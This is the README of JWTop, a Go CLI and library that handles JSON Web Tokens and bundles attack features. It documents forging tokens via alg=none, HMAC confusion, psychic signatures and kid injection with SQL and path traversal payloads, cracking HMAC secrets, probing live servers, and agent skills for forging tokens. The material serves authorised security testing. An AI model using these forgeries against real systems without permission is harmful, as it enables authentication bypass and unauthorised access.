<div align="center">

# JWTop

**A fast, developer-friendly JWT operations toolkit — decode, verify, create, sign, crack, and exploit JSON Web Tokens.**

[![Join Discord](https://img.shields.io/discord/1242773130137833493?label=Discord&style=for-the-badge)](https://www.cerberauth.com/community)
[![Build](https://img.shields.io/github/actions/workflow/status/cerberauth/jwtop/ci.yml?branch=main&label=build&style=for-the-badge)](https://github.com/cerberauth/jwtop/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/cerberauth/jwtop?sort=semver&style=for-the-badge)](https://github.com/cerberauth/jwtop/releases)
[![Coverage](https://img.shields.io/codecov/c/gh/cerberauth/jwtop?token=BD1WPXJDAW&style=for-the-badge)](https://codecov.io/gh/cerberauth/jwtop)
[![Go Report Card](https://goreportcard.com/badge/github.com/cerberauth/jwtop?style=for-the-badge)](https://goreportcard.com/report/github.com/cerberauth/jwtop)
[![GoDoc](https://img.shields.io/badge/godoc-reference-5272B4.svg?style=for-the-badge)](https://godoc.org/github.com/cerberauth/jwtop)
[![Stars](https://img.shields.io/github/stars/cerberauth/jwtop?style=for-the-badge)](https://github.com/cerberauth/jwtop)
[![License](https://img.shields.io/github/license/cerberauth/jwtop?style=for-the-badge)](https://github.com/cerberauth/jwtop/blob/main/LICENSE)

</div>

---

JWTop is a Go library and CLI for working with JSON Web Tokens. It covers the full JWT lifecycle: decoding, verifying, creating, and signing tokens — plus a security-testing layer for probing and exploiting common JWT vulnerabilities.

- **CLI** — decode, verify, create, sign, crack, and exploit tokens from the terminal
- **Library** — composable Go packages for each operation, designed for direct integration
- **Security testing** — built-in exploit primitives (alg=none, HMAC confusion, kid injection, blank secret, null signature, psychic signature) and a server vulnerability scanner

> **Disclaimer:** The `exploit` and `crack` functionality is intended for authorised security testing, penetration testing, CTF competitions, and educational purposes only. Never test systems you do not own or have explicit written permission to test.

---

## Features

| Feature | CLI | Library |
|---------|:---:|:-------:|
| Decode JWT (no verification) | ✓ | ✓ |
| Verify signature (HMAC, RSA, ECDSA, JWKS) | ✓ | ✓ |
| Create and sign new tokens | ✓ | ✓ |
| Re-sign existing tokens | ✓ | ✓ |
| Crack HMAC secret (dictionary attack) | ✓ | ✓ |
| Probe server for JWT vulnerabilities | ✓ | ✓ |
| alg=none bypass | ✓ | ✓ |
| Blank secret | ✓ | ✓ |
| Null signature | ✓ | ✓ |
| HMAC confusion (RSA/EC → HMAC) | ✓ | ✓ |
| Psychic signature (ECDSA r=0, s=0) | ✓ | ✓ |
| kid injection (SQL, path traversal, raw) | ✓ | ✓ |

---

## Installation

### CLI

**Using `go install`:**

```sh
go install github.com/cerberauth/jwtop@latest
```

**From source:**

```sh
git clone https://github.com/cerberauth/jwtop.git
cd jwtop
go build -o jwtop .
```

### Library

Install only the packages you need:

```sh
# Core operations (decode, verify, create, sign)
go get github.com/cerberauth/jwtop/jwt

# Token editor (re-sign and mutate existing tokens)
go get github.com/cerberauth/jwtop/jwt/editor

# Security exploit primitives
go get github.com/cerberauth/jwtop/jwt/exploit

# Server vulnerability prober
go get github.com/cerberauth/jwtop/jwt/crack
```

---

## CLI Usage

```
jwtop [command] [flags]

Commands:
  decode    Decode and pretty-print a JWT
  verify    Verify a JWT signature
  create    Create and sign a new JWT
  sign      Re-sign an existing JWT
  crack     Probe a server for JWT vulnerabilities
  exploit   Apply a known exploit to a JWT
  version   Print version information
```

### decode

Decode and pretty-print a JWT without verifying the signature.

```sh
jwtop decode <token>
```

```sh
jwtop decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U
```

```
Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Claims:
{
  "sub": "1234567890"
}

Signature:
dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U
```

---

### verify

Verify a JWT signature and print its claims. Exits `1` if the token is invalid.

```sh
jwtop verify <token> [--secret <secret>] [--key <pem-file>] [--jwks <uri>]
```

| Flag | Description |
|------|-------------|
| `--secret` | HMAC secret string |
| `--key` | Path or URL to PEM public (or private) key file |
| `--jwks` | JWKS endpoint URI |

```sh
# HMAC
jwtop verify $TOKEN --secret mysecret

# RSA/ECDSA public key (file or URL)
jwtop verify $TOKEN --key /path/to/public.pem
jwtop verify $TOKEN --key https://example.com/public.pem

# JWKS endpoint
jwtop verify $TOKEN --jwks https://example.com/.well-known/jwks.json
```

---

### create

Create and sign a new JWT.

```sh
jwtop create --alg <alg> (--secret <secret> | --key <pem-file>) [options]
```

| Flag | Description |
|------|-------------|
| `--alg` | Signing algorithm, e.g. `HS256`, `RS256`, `ES256` **(required)** |
| `--secret` | HMAC secret string |
| `--key` | Path or URL to PEM private key file |
| `--claim key=value` | Custom claim (repeatable) |
| `--sub` | Subject claim |
| `--iss` | Issuer claim |
| `--aud` | Audience claim |
| `--exp` | Expiration duration, e.g. `1h`, `30m` |
| `--iat` | Include issued-at claim |

Claim values are auto-parsed: integers and booleans are stored as their native types; everything else as a string.

```sh
# HS256 with claims
jwtop create --alg HS256 --secret mysecret \
  --sub user123 --iss myapp --exp 1h --iat \
  --claim role=admin --claim plan=pro

# RS256 with a private key
jwtop create --alg RS256 --key /path/to/private.pem --sub user123 --exp 24h
```

---

### sign

Re-sign an existing JWT with a new algorithm or key. Original claims are preserved.

```sh
jwtop sign <token> --alg <alg> (--secret <secret> | --key <pem-file>)
```

| Flag | Description |
|------|-------------|
| `--alg` | Target signing algorithm, or `none` **(required)** |
| `--secret` | HMAC secret string |
| `--key` | Path or URL to PEM private key file |

```sh
# Change algorithm and key
jwtop sign $TOKEN --alg RS256 --key /path/to/private.pem

# Strip signature (alg=none)
jwtop sign $TOKEN --alg none
```

---

### crack

Analyse a JWT for vulnerabilities. Without `--url` the analysis is **offline** (pure cryptographic checks, no network). With `--url` each exploit technique probes a live server.

```sh
# Offline — no URL required
jwtop crack <token> [--wordlist <file>] [--secret <s>...] [--workers <n>]

# Online — probe a live server
jwtop crack <token> --url <url> [--expected-status <n>] [--key <pem-file>] [--wordlist <file>] [--secret <s>...] [--workers <n>]
```

| Flag | Description |
|------|-------------|
| `--url` | Target URL to probe (omit for offline analysis) |
| `--expected-status` | HTTP status that signals a successful exploit (default `200`) |
| `--key` | Path or URL to PEM public key for the `hmacconfusion` probe |
| `--wordlist` | Path to a newline-delimited file of candidate secrets |
| `--secret` | Explicit candidate secret (repeatable) |
| `--workers` | Concurrent workers for secret brute-force (default `8`) |
| `--kid-sql-table` | Table name for the kid SQL injection payload (default `tokens`) |
| `--kid-path` | File path for the kid path traversal payload (default `/dev/null`) |
| `--token-in` | Where to place the exploited JWT: `header`, `cookie`, `query`, or `body` (default `header`) |
| `--token-name` | Header/cookie/query/form-field name for the JWT (default `Authorization` for header, `token` otherwise) |
| `--token-prefix` | Value prefix before the token, e.g. `Bearer ` (default `Bearer ` only for the default Authorization header) |

**Offline checks** (cryptographic proof, no server needed):

| Check | What it detects |
|-------|----------------|
| `algnone` | Token already uses `alg=none` |
| `blanksecret` | Token is signed with an empty HMAC secret |
| `nullsig` | Token has an empty signature segment |
| `weaksecret` | Cracks the HMAC signing secret via dictionary attack |

**Online-only checks** (require `--url`): `algnone` (×4 casing variants), `hmacconfusion` (requires `--key`), `psychicsig` (ECDSA-only), `kidinjection` (SQL and path traversal).

```sh
# Offline — detect cryptographic weaknesses
jwtop crack $TOKEN

# Offline — crack the signing secret with a wordlist
jwtop crack $TOKEN --wordlist /path/to/secrets.txt --secret mysecret

# Online — probe a server with all techniques
jwtop crack $TOKEN --url https://api.example.com/protected

# Online — include hmacconfusion probe
jwtop crack $TOKEN --url https://api.example.com/protected --key public.pem

# Online — JWT expected in a cookie instead of Authorization header
jwtop crack $TOKEN --url https://api.example.com/protected --token-in cookie --token-name session

# Online — JWT expected as a query parameter
jwtop crack $TOKEN --url https://api.example.com/protected --token-in query --token-name access_token

# Online — JWT expected in a form-encoded POST body
jwtop crack $TOKEN --url https://api.example.com/protected --token-in body --token-name jwt

# Online — JWT expected in a custom header
jwtop crack $TOKEN --url https://api.example.com/protected --token-in header --token-name X-Auth-Token --token-prefix "Token "
```

Exits `0` when at least one vulnerability was found, `1` when none were.

---

### exploit

Apply a known security exploit to an existing JWT and print the modified token. Each subcommand is a standalone technique.

```sh
jwtop exploit <subcommand> <token> [flags]
```

| Subcommand | Description |
|------------|-------------|
| `algnone` | Set `alg=none` and strip the signature |
| `blanksecret` | Re-sign with an empty HMAC secret |
| `nullsig` | Strip the signature, keep the original `alg` header |
| `hmacconfusion` | Re-sign an RSA/ECDSA token as HMAC using the public key PEM |
| `psychicsig` | Re-sign an ECDSA token with an all-zero (r=0, s=0) signature |
| `weaksecret` | Dictionary-attack the HMAC signing secret |
| `kidinjection` | Manipulate the `kid` header field and re-sign |

**algnone**

```sh
jwtop exploit algnone $TOKEN
jwtop exploit algnone --all $TOKEN   # emit all capitalisation variants
```

**blanksecret**

```sh
jwtop exploit blanksecret $TOKEN
```

**nullsig**

```sh
jwtop exploit nullsig $TOKEN
```

**hmacconfusion** — re-signs `RS*/ES*/PS*` tokens as their HMAC equivalent using the server's public key PEM as the secret.

```sh
jwtop exploit hmacconfusion $TOKEN --key /path/to/public.pem
jwtop exploit hmacconfusion $TOKEN --key https://example.com/public.pem
```

**psychicsig** — re-signs `ES256`/`ES384`/`ES512` tokens with an all-zero `r=0, s=0` signature (CVE-2022-21449, "psychic signatures in Java").

```sh
jwtop exploit psychicsig $TOKEN
```

**weaksecret** — dictionary-attack the HMAC signing secret.

```sh
jwtop exploit weaksecret $TOKEN                                   # built-in wordlist
jwtop exploit weaksecret $TOKEN --secret mysecret --secret s3cr3t # explicit guesses
jwtop exploit weaksecret $TOKEN --wordlist /path/to/secrets.txt   # custom wordlist
```

| Flag | Description |
|------|-------------|
| `--wordlist` | Newline-delimited file of candidate secrets |
| `--secret` | Explicit candidate secret (repeatable) |
| `--workers` | Concurrent workers (default `8`) |

Prints the recovered secret on success (exit `0`), exits `1` when not found.

**kidinjection** — manipulate the `kid` header and re-sign.

```sh
jwtop exploit kidinjection --mode sql $TOKEN                              # SQL injection (table: tokens)
jwtop exploit kidinjection --mode sql --sql-table keys $TOKEN             # SQL injection (custom table)
jwtop exploit kidinjection --mode path $TOKEN                             # path traversal to /dev/null
jwtop exploit kidinjection --mode path --path /proc/sys/kernel/ns_last_pid $TOKEN  # custom path
jwtop exploit kidinjection --mode raw --kid "../../etc/passwd" --secret "" $TOKEN
```

| Flag | Description |
|------|-------------|
| `--mode` | `sql`, `path`, or `raw` (default `sql`) |
| `--kid` | Override the kid value |
| `--secret` | HMAC secret to sign with (overrides mode default) |
| `--sql-table` | Table name for `sql` mode payload (default `tokens`) |
| `--path` | File path for `path` mode payload (default `/dev/null`) |

---

## Agent Skills

This repo ships four Agent Skills under [`skills/`](./skills) — portable `SKILL.md` packages that teach a coding agent how to drive `jwtop` for decoding, auditing, and forging JWTs from plain-language requests instead of typed commands. The format is open and not tied to any one tool — Claude Code, Cursor, OpenCode, Codex, and other agents that support `SKILL.md` packages can all use them.

| Skill | Triggers on |
|---|---|
| [`jwtop`](./skills/jwtop) | General driver for the full CLI — decode, verify, create, sign, crack, exploit |
| [`jwt-decode-explain`](./skills/jwt-decode-explain) | "What's in this token" — plain-language decode + risk explanation, read-only |
| [`jwt-security-audit`](./skills/jwt-security-audit) | "Is this token/API secure" — runs `crack`, translates findings into a verdict + remediation |
| [`jwt-token-forge`](./skills/jwt-token-forge) | "Generate a test JWT with claims X" — mints signed fixture tokens, generates keys as needed |

### Install

The easiest way, for any agent, is `npx skills` — it detects which agent you're using and installs into the right directory automatically:

```sh
npx skills add cerberauth/jwtop --skill jwtop
npx skills add cerberauth/jwtop --skill jwt-decode-explain
npx skills add cerberauth/jwtop --skill jwt-security-audit
npx skills add cerberauth/jwtop --skill jwt-token-forge
```

**Manual install, Claude Code:** auto-discovers skills from `.claude/skills/` (project) or `~/.claude/skills/` (personal) — a plain top-level `skills/` directory isn't picked up on its own.

Inside a `jwtop` checkout:

```sh
ln -s ../skills .claude/skills
```

In any other project, to use these skills everywhere:

```sh
cp -r skills/jwtop skills/jwt-decode-explain skills/jwt-security-audit skills/jwt-token-forge ~/.claude/skills/
```

**Manual install, other agents** — consult your tool's docs for where it looks for `SKILL.md` packages; the files here follow the same open format, no jwtop-specific conventions.

Then ask your agent things like "what's in this JWT", "audit this token for vulnerabilities", or "give me an RS256 test token with sub=user123" — the matching skill triggers automatically.

---

## Library Usage

### Core operations — `jwt`

```go
import "github.com/cerberauth/jwtop/jwt"
```

**Decode** (no verification):

```go
decoded, err := jwt.Decode(tokenString)
// decoded.Header    → map[string]interface{}
// decoded.Claims    → map[string]interface{}
// decoded.Signature → base64url string
```

**Verify:**

```go
result, err := jwt.Verify(tokenString, jwt.VerifyOptions{
    Secret: []byte("mysecret"),
    // KeyPEM:  pemBytes,
    // JWKSURI: "https://example.com/.well-known/jwks.json",
})
// err is non-nil only for structural problems (malformed token, missing key).
// result.Valid is false when the signature doesn't match.
if result.Valid {
    fmt.Println("valid:", result.Claims)
} else {
    fmt.Println("invalid:", result.Error)
}
```

**Create:**

```go
// HMAC
token, err := jwt.CreateWithSecret(jwt.CreateOptions{
    Algorithm:  "HS256",
    Claims:     map[string]string{"sub": "user123", "role": "admin"},
    Expiration: time.Hour,
    IssuedAt:   true,
}, []byte("mysecret"))

// Asymmetric
token, err = jwt.Create(jwt.CreateOptions{
    Algorithm: "RS256",
    Claims:    map[string]string{"sub": "user123"},
}, privateKey)
```

### Token editor — `jwt/editor`

Parse an existing token (without verifying it) and re-sign with a different algorithm or key.

```go
import "github.com/cerberauth/jwtop/jwt/editor"

te, err := editor.NewTokenEditor(existingToken)

signed, err := te.SignWithMethodAndKey(jwtlib.SigningMethodHS256, []byte("newsecret"))
signed, err  = te.SignWithKey(privateKey)
signed, err  = te.SignWithMethodAndRandomKey(jwtlib.SigningMethodRS256)
signed, err  = te.WithAlgNone()
noSig, err  := te.WithoutSignature()

// Adjust exp/nbf so the token is currently valid
valid := editor.NewTokenEditorWithValidClaims(te)
```

### Exploit primitives — `jwt/exploit`

```go
import "github.com/cerberauth/jwtop/jwt/exploit"

token, err  := exploit.AlgNone(tokenString)
tokens, err := exploit.AlgNoneAll(tokenString)      // all capitalisation variants
token, err   = exploit.BlankSecret(tokenString)
token, err   = exploit.NullSignature(tokenString)
token, err   = exploit.HMACConfusion(tokenString, pubPEM)
token, err   = exploit.KidSQLInjection(tokenString, exploit.DefaultKidSQLPayload, []byte("secret"))
token, err   = exploit.KidPathTraversal(tokenString, exploit.DefaultKidPathTraversalPayload, []byte(""))
token, err   = exploit.KidInjection(tokenString, "../../etc/shadow", jwtlib.SigningMethodHS256, []byte(""))

// HMAC secret cracking
result, err := exploit.CrackSecret(tokenString, exploit.WeakSecrets(), 8)
if result.Found {
    fmt.Println("secret:", result.Secret)
}
secrets, err := exploit.SecretsFromFile("/path/to/wordlist.txt")
```

### Server prober — `jwt/crack`

```go
import "github.com/cerberauth/jwtop/jwt/crack"

results, err := crack.ProbeAll(ctx, tokenString, crack.ProbeOptions{
    URL:            "https://api.example.com/protected",
    ExpectedStatus: 200,
    PublicKeyPEM:   pubPEM, // nil skips hmacconfusion
    Candidates:     exploit.DefaultSecrets,
    Workers:        8,
    // TokenLocation defaults to Authorization: Bearer <token> when omitted.
    TokenLocation: crack.TokenLocation{In: "cookie", Name: "session"},
})
for _, r := range results {
    switch {
    case r.Skipped:
        fmt.Printf("[-] %s  skipped (%s)\n", r.Name, r.SkipReason)
    case r.Err != nil:
        fmt.Printf("[!] %s  error: %v\n", r.Name, r.Err)
    case r.Status == 200:
        fmt.Printf("[+] %s  VULNERABLE\n", r.Name)
    default:
        fmt.Printf("[ ] %s  %d\n", r.Name, r.Status)
    }
}
```

### Key utilities

```go
pubKey, err  := jwt.LoadPublicKeyFromPEM(pemBytes)
privKey, err := jwt.LoadPrivateKeyFromPEM(pemBytes)
key, err     := jwt.GenerateKey(jwt.SigningMethodRS256)
keyfunc, err := jwt.FetchJWKS("https://example.com/.well-known/jwks.json")
method, err  := jwt.ParseSigningMethod("ES256")
ok           := jwt.IsJWT(tokenString)
```

---

## Supported Algorithms

| Family | Algorithms |
|--------|-----------|
| HMAC | HS256, HS384, HS512 |
| RSA | RS256, RS384, RS512 |
| RSA-PSS | PS256, PS384, PS512 |
| ECDSA | ES256, ES384, ES512 |
| None | none |

---

## Acknowledgements

- **[jwt_tool](https://github.com/ticarpi/jwt_tool)** by [@ticarpi](https://github.com/ticarpi) — the reference JWT attack toolkit. The `exploit` package reproduces the key attacks covered by jwt_tool: alg=none bypass, HMAC confusion, null signature, blank secret, and kid header injection.
- **[vulnapi](https://github.com/cerberauth/vulnapi)** — the CerberAuth API vulnerability scanner, which provided the implementation patterns for the exploit and crack packages.

---

## License

MIT © [CerberAuth](https://www.cerberauth.com/) — see [LICENSE](https://github.com/cerberauth/jwtop/blob/main/LICENSE) for details.
